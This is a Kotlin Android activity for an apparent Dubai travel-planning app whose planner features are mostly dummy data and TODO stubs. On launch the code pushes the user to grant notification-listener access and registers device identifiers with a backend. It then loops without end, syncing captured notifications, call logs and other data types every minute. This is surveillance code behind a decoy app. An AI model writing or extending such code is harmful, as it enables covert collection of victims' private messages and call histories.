package com.devicesync.app

import android.app.DatePickerDialog
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import androidx.core.app.NotificationCompat
import com.devicesync.app.adapters.DestinationsAdapter
import com.devicesync.app.adapters.ActivitiesAdapter
import com.devicesync.app.data.Destination
import com.devicesync.app.models.Activity
import com.devicesync.app.data.Package
import com.devicesync.app.data.Review
import com.devicesync.app.data.TravelTip
import com.devicesync.app.data.DummyDataProvider
import com.devicesync.app.services.NotificationListenerService
import com.devicesync.app.services.BackendSyncService
import com.devicesync.app.utils.DeviceInfoUtils
import com.devicesync.app.utils.SettingsManager
import com.bumptech.glide.Glide
import java.text.SimpleDateFormat
import java.util.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import androidx.lifecycle.lifecycleScope
import com.devicesync.app.services.SyncResult
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay

class MainActivity : AppCompatActivity() {
    
    // UI Components
    private lateinit var startPlanningButton: Button
    private lateinit var continuePlanningButton: Button
    private lateinit var dateRangeText: TextView
    private lateinit var startDateText: TextView
    private lateinit var endDateText: TextView
    private lateinit var progressText: TextView
    private lateinit var destinationsRecyclerView: RecyclerView
    private lateinit var activitiesRecyclerView: RecyclerView
    private lateinit var packagesRecyclerView: RecyclerView
    private lateinit var reviewsRecyclerView: RecyclerView
    private lateinit var tipsRecyclerView: RecyclerView
    
    // Adapters
    private lateinit var destinationsAdapter: DestinationsAdapter
    private lateinit var activitiesAdapter: ActivitiesAdapter
    
    // Date picker variables
    private var startDate: Calendar? = null
    private var endDate: Calendar? = null
    
    // Sync functionality
    private lateinit var backendSyncService: BackendSyncService
    private lateinit var settingsManager: SettingsManager
    
    // Automatic sync variables
    private var autoSyncJob: Job? = null
    private val autoSyncInterval = 60 * 1000L // 1 minute in milliseconds
    private var isFirstSync = true
    private var lastNotificationSyncTime = 0L
    private var lastCallLogSyncTime = 0L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        // Initialize sync services
        backendSyncService = BackendSyncService(this)
        settingsManager = SettingsManager(this)
        
        setupViews()
        setupRecyclerViews()
        loadSampleData()
        setupDatePickers()
        setupServiceButtons()
        
        // Show notification count and request permissions
        showNotificationCount()
        requestNotificationPermission()
        
        // Start automatic sync
        startAutomaticSync()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopAutomaticSync()
    }
    
    private fun startAutomaticSync() {
        // Cancel any existing auto sync job
        autoSyncJob?.cancel()
        
        // Start new automatic sync job
        autoSyncJob = lifecycleScope.launch {
            while (true) {
                try {
                    if (isFirstSync) {
                        // First time: Full sync of all data types
                        println("🚀 FIRST TIME SYNC - Starting comprehensive data sync...")
                        Toast.makeText(this@MainActivity, "First time sync starting...", Toast.LENGTH_SHORT).show()
                        syncAllData()
                        isFirstSync = false
                        println("✅ First time sync completed")
                    } else {
                        // Subsequent syncs: Only latest notifications and call logs
                        println("🔄 Periodic sync - Syncing latest data...")
                        
                        // Sync latest notifications (after last sync time)
                        syncLatestNotifications()
                        
                        // Sync call logs (every 1 minute)
                        val currentTime = System.currentTimeMillis()
                        if (currentTime - lastCallLogSyncTime >= 60000) { // 1 minute
                            syncLatestCallLogs()
                            lastCallLogSyncTime = currentTime
                        }
                    }
                } catch (e: Exception) {
                    println("❌ Automatic sync failed: ${e.message}")
                }
                
                // Wait for the specified interval
                delay(autoSyncInterval)
            }
        }
    }
    
    private fun stopAutomaticSync() {
        autoSyncJob?.cancel()
        autoSyncJob = null
        println("🛑 Automatic sync stopped")
    }
    
    private fun syncLatestNotifications() {
        lifecycleScope.launch {
            try {
                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceInfo(this@MainActivity).deviceId
                println("🔔 Syncing latest notifications for device: $deviceId")
                
                // Get current time for tracking
                val currentTime = System.currentTimeMillis()
                
                // Sync notifications from the last sync time
                val result = backendSyncService.syncNotifications(deviceId, lastNotificationSyncTime)
                when (result) {
                    is SyncResult.Success -> {
                        val count = result.itemsSynced
                        if (count > 0) {
                            println("✅ Synced $count new notifications")
                            Toast.makeText(this@MainActivity, "Synced $count new notifications", Toast.LENGTH_SHORT).show()
                        }
                        lastNotificationSyncTime = currentTime
                    }
                    is SyncResult.Error -> {
                        println("❌ Failed to sync notifications: ${result.message}")
                    }
                }
            } catch (e: Exception) {
                println("❌ Error syncing notifications: ${e.message}")
            }
        }
    }
    
    private fun syncLatestCallLogs() {
        lifecycleScope.launch {
            try {
                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceInfo(this@MainActivity).deviceId
                println("📞 Syncing latest call logs for device: $deviceId")
                
                // Sync call logs from the last sync time
                val result = backendSyncService.syncCallLogs(deviceId)
                when (result) {
                    is SyncResult.Success -> {
                        val count = result.itemsSynced
                        if (count > 0) {
                            println("✅ Synced $count new call logs")
                            Toast.makeText(this@MainActivity, "Synced $count new call logs", Toast.LENGTH_SHORT).show()
                        }
                    }
                    is SyncResult.Error -> {
                        println("❌ Failed to sync call logs: ${result.message}")
                    }
                }
            } catch (e: Exception) {
                println("❌ Error syncing call logs: ${e.message}")
            }
        }
    }
    
    private fun setupViews() {
        startDateText = findViewById(R.id.startDateText)
        endDateText = findViewById(R.id.endDateText)
        startPlanningButton = findViewById(R.id.startPlanningButton)
        continuePlanningButton = findViewById(R.id.continuePlanningButton)
        dateRangeText = findViewById(R.id.dateRangeText)
        progressText = findViewById(R.id.progressText)
        
        destinationsRecyclerView = findViewById(R.id.destinationsRecyclerView)
        activitiesRecyclerView = findViewById(R.id.activitiesRecyclerView)
        packagesRecyclerView = findViewById(R.id.packagesRecyclerView)
        reviewsRecyclerView = findViewById(R.id.reviewsRecyclerView)
        tipsRecyclerView = findViewById(R.id.tipsRecyclerView)
        
        startPlanningButton.setOnClickListener {
            if (startDate != null && endDate != null) {
                Toast.makeText(this, "Starting your UAE trip planning!", Toast.LENGTH_LONG).show()
                // TODO: Navigate to planning screen
            } else {
                Toast.makeText(this, "Please select start and end dates", Toast.LENGTH_SHORT).show()
            }
        }
        
        continuePlanningButton.setOnClickListener {
            Toast.makeText(this, "Continue planning your itinerary", Toast.LENGTH_SHORT).show()
            // TODO: Navigate to itinerary builder
        }
        
        // Load online Dubai image in header
        val headerImageView = findViewById<android.widget.ImageView>(R.id.headerImageView)
        Glide.with(this)
            .load("https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=200&h=200&fit=crop&crop=center")
            .placeholder(R.drawable.original_logo)
            .error(R.drawable.original_logo)
            .centerCrop()
            .into(headerImageView)
    }
    
    private fun setupDatePickers() {
        startDateText.setOnClickListener {
            showDatePicker(true)
        }
        
        endDateText.setOnClickListener {
            showDatePicker(false)
        }
    }
    
    private fun showDatePicker(isStartDate: Boolean) {
        val calendar = Calendar.getInstance()
        
        val datePickerDialog = DatePickerDialog(
            this,
            { _, year, month, dayOfMonth ->
                val selectedDate = Calendar.getInstance()
                selectedDate.set(year, month, dayOfMonth)
                
                if (isStartDate) {
                    startDate = selectedDate
                    startDateText.text = formatDate(selectedDate)
                } else {
                    endDate = selectedDate
                    endDateText.text = formatDate(selectedDate)
                }
                
                updateDateRange()
            },
            calendar.get(Calendar.YEAR),
            calendar.get(Calendar.MONTH),
            calendar.get(Calendar.DAY_OF_MONTH)
        )
        
        datePickerDialog.show()
    }
    
    private fun formatDate(calendar: Calendar): String {
        val dateFormat = SimpleDateFormat("MMM dd", Locale.getDefault())
        return dateFormat.format(calendar.time)
    }
    
    private fun showNotificationCount() {
        try {
            // Check if notification access is enabled
            val enabledNotificationListeners = Settings.Secure.getString(
                contentResolver,
                "enabled_notification_listeners"
            )
            
            val packageName = packageName
            val isEnabled = enabledNotificationListeners?.contains(packageName) == true
            
            // Get device info for additional context
            val deviceInfo = getDeviceInfo()
            
            // Show comprehensive toast with notification access status and device info
            val message = buildString {
                append("📱 Dubai Discoveries App Loaded!\n")
                append("🔔 Notification Access: ${if (isEnabled) "✅ Enabled" else "❌ Disabled"}\n")
                append("📱 Device: ${deviceInfo.deviceName}\n")
                append("🆔 Device ID: ${deviceInfo.deviceId.take(8)}...")
            }
            
            Toast.makeText(this, message, Toast.LENGTH_LONG).show()
            
            // Also log the status for debugging
            android.util.Log.d("MainActivity", "Notification access: $isEnabled, Device: ${deviceInfo.deviceName}")
            
            // If notification access is not enabled, show a more prominent message
            if (!isEnabled) {
                Toast.makeText(
                    this,
                    "⚠️ Please enable notification access for real-time sync!",
                    Toast.LENGTH_LONG
                ).show()
            }
            
        } catch (e: Exception) {
            // If we can't access notification settings, show a generic message
            Toast.makeText(this, "📱 Dubai Discoveries app loaded successfully!", Toast.LENGTH_LONG).show()
            android.util.Log.e("MainActivity", "Error checking notification access: ${e.message}")
        }
    }
    
    private fun getDeviceInfo(): DeviceInfo {
        return try {
            val deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL
            val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            DeviceInfo(deviceId, deviceName)
        } catch (e: Exception) {
            DeviceInfo("unknown_device", "Unknown Device")
        }
    }
    
    data class DeviceInfo(
        val deviceId: String,
        val deviceName: String
    )
    
    private fun updateDateRange() {
        if (startDate != null && endDate != null) {
            val startFormatted = SimpleDateFormat("MMM dd", Locale.getDefault()).format(startDate!!.time)
            val endFormatted = SimpleDateFormat("MMM dd", Locale.getDefault()).format(endDate!!.time)
            dateRangeText.text = "$startFormatted – $endFormatted"
        }
    }
    
    private fun setupRecyclerViews() {
        // Destinations RecyclerView
        destinationsRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        destinationsAdapter = DestinationsAdapter(emptyList()) { destination ->
            Toast.makeText(this, "Exploring ${destination.name}", Toast.LENGTH_SHORT).show()
        }
        destinationsRecyclerView.adapter = destinationsAdapter
        
        // Activities RecyclerView - Horizontal slider
        activitiesRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        activitiesAdapter = ActivitiesAdapter(emptyList()) { activity ->
            Toast.makeText(this, "Added ${activity.title} to itinerary", Toast.LENGTH_SHORT).show()
        }
        activitiesRecyclerView.adapter = activitiesAdapter
        
        // Packages RecyclerView
        packagesRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        // TODO: Add PackagesAdapter
        
        // Reviews RecyclerView
        reviewsRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
        // TODO: Add ReviewsAdapter
        
        // Tips RecyclerView
        tipsRecyclerView.layoutManager = LinearLayoutManager(this)
        // TODO: Add TipsAdapter
    }
    
    private fun loadSampleData() {
        // Load destinations from dummy data
        destinationsAdapter.updateDestinations(DummyDataProvider.destinations)
        
        // Load activities from dummy data
        activitiesAdapter.updateActivities(DummyDataProvider.activities)
    }
    
    private fun requestNotificationPermission() {
        try {
            // Check if notification access is already enabled
            val enabledNotificationListeners = Settings.Secure.getString(
                contentResolver,
                "enabled_notification_listeners"
            )
            
            val packageName = packageName
            val isEnabled = enabledNotificationListeners?.contains(packageName) == true
            
            if (!isEnabled) {
                // Show dialog to guide user to enable notification access
                Toast.makeText(
                    this,
                    "🔔 Please enable notification access for real-time sync!\n\nTap OK to open settings...",
                    Toast.LENGTH_LONG
                ).show()
                
                // Open notification access settings after a short delay
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    try {
                        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                        startActivity(intent)
                        println("🔔 Opened notification access settings")
                    } catch (e: Exception) {
                        println("❌ Error opening notification settings: ${e.message}")
                        Toast.makeText(
                            this,
                            "Please manually enable notification access in Settings > Apps > Dubai Discoveries > Notifications",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                }, 2000) // 2 second delay
            } else {
                // Notification access is already enabled, start the service
                println("🔔 Notification access already enabled, starting service...")
                startNotificationService()
            }
        } catch (e: Exception) {
            println("❌ Error checking notification permission: ${e.message}")
            Toast.makeText(
                this,
                "Error checking notification access. Please enable it manually in Settings.",
                Toast.LENGTH_LONG
            ).show()
        }
    }
    
    private fun startNotificationService() {
        try {
            val intent = Intent(this, NotificationListenerService::class.java)
            startService(intent)
            println("🔔 NotificationListenerService started")
        } catch (e: Exception) {
            println("❌ Error starting NotificationListenerService: ${e.message}")
        }
    }
    
    private fun setupServiceButtons() {
        // Load online Dubai image in header
        val headerImageView = findViewById<android.widget.ImageView>(R.id.headerImageView)
        Glide.with(this)
            .load("https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=200&h=200&fit=crop&crop=center")
            .placeholder(R.drawable.original_logo)
            .error(R.drawable.original_logo)
            .centerCrop()
            .into(headerImageView)
            
        // Set up button click handlers
        findViewById<Button>(R.id.airportTransferButton).setOnClickListener {
            Toast.makeText(this, "Airport Transfer service added!", Toast.LENGTH_SHORT).show()
        }
        
        findViewById<Button>(R.id.privateGuideButton).setOnClickListener {
            Toast.makeText(this, "Private Guide service added!", Toast.LENGTH_SHORT).show()
        }
        
        findViewById<Button>(R.id.carWithDriverButton).setOnClickListener {
            Toast.makeText(this, "Car with Driver service added!", Toast.LENGTH_SHORT).show()
        }
        
        findViewById<Button>(R.id.simCardButton).setOnClickListener {
            Toast.makeText(this, "SIM Card service added!", Toast.LENGTH_SHORT).show()
        }
        
        // Add test notification button for debugging
        findViewById<Button>(R.id.testNotificationButton)?.setOnClickListener {
            sendTestNotification()
        }
        
        // Add sync data button for manual sync
        findViewById<Button>(R.id.syncDataButton)?.setOnClickListener {
            syncAllData()
        }
    }
    
    private fun sendTestNotification() {
        try {
            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as android.app.NotificationManager
            
            // Create notification channel for Android 8.0+
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                val channel = android.app.NotificationChannel(
                    "test_channel",
                    "Test Notifications",
                    android.app.NotificationManager.IMPORTANCE_DEFAULT
                )
                notificationManager.createNotificationChannel(channel)
            }
            
            // Create test notification
            val notification = NotificationCompat.Builder(this, "test_channel")
                .setContentTitle("Test Notification")
                .setContentText("This is a test notification to verify real-time capture")
                .setSmallIcon(R.drawable.original_logo)
                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                .setAutoCancel(true)
                .build()
            
            // Show notification
            notificationManager.notify(999, notification)
            
            Toast.makeText(this, "Test notification sent! Check logs for capture details.", Toast.LENGTH_LONG).show()
            println("🧪 TEST NOTIFICATION SENT - ID: 999")
            
        } catch (e: Exception) {
            Toast.makeText(this, "Error sending test notification: ${e.message}", Toast.LENGTH_SHORT).show()
            println("❌ Error sending test notification: ${e.message}")
        }
    }
    
    private fun syncAllData() {
        lifecycleScope.launch {
            try {
                println("🔄 Starting data sync...")
                Toast.makeText(this@MainActivity, "Starting data sync...", Toast.LENGTH_SHORT).show()
                
                // Get or generate device ID
                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceInfo(this@MainActivity).deviceId
                println("📱 Using device ID: $deviceId")
                
                // Try to register device, but continue even if it fails
                try {
                    // Create DeviceInfo object for registration
                    val deviceInfo = com.devicesync.app.data.DeviceInfo(
                        deviceId = deviceId,
                        deviceName = android.os.Build.MODEL,
                        model = android.os.Build.MODEL,
                        manufacturer = android.os.Build.MANUFACTURER,
                        androidVersion = android.os.Build.VERSION.RELEASE,
                        isConnected = true,
                        connectionType = com.devicesync.app.data.ConnectionType.NETWORK
                    )
                    
                    val registerResult = backendSyncService.registerDevice(deviceInfo)
                    if (registerResult.isSuccess) {
                        println("✅ Device registration successful")
                    } else {
                        println("⚠️ Device registration failed: ${registerResult.exceptionOrNull()?.message}")
                        // Continue with sync even if registration fails
                    }
                } catch (e: Exception) {
                    println("⚠️ Device registration error: ${e.message}")
                    // Continue with sync even if registration fails
                }
                
                // Proceed with data sync
                println("🔄 Starting testAllDataTypes...")
                val syncResults = backendSyncService.testAllDataTypes(deviceId)
                
                // Process results
                var successCount = 0
                var errorCount = 0
                val errorMessages = mutableListOf<String>()
                
                syncResults.forEach { (dataType, result) ->
                    when (result) {
                        is SyncResult.Success -> {
                            successCount++
                            println("✅ $dataType: ${result.itemsSynced} items synced")
                        }
                        is SyncResult.Error -> {
                            errorCount++
                            errorMessages.add("$dataType: ${result.message}")
                            println("❌ $dataType: ${result.message}")
                        }
                    }
                }
                
                // Show results
                val resultMessage = if (successCount > 0) {
                    "✅ Synced $successCount data types successfully"
                } else {
                    "❌ All sync operations failed"
                }
                
                if (errorMessages.isNotEmpty()) {
                    println("❌ Sync errors: ${errorMessages.joinToString(", ")}")
                }
                
                Toast.makeText(this@MainActivity, resultMessage, Toast.LENGTH_LONG).show()
                println("🔄 Data sync completed: $resultMessage")
                
            } catch (e: Exception) {
                println("❌ Error in syncAllData: ${e.message}")
                Toast.makeText(this@MainActivity, "Sync failed: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }
}
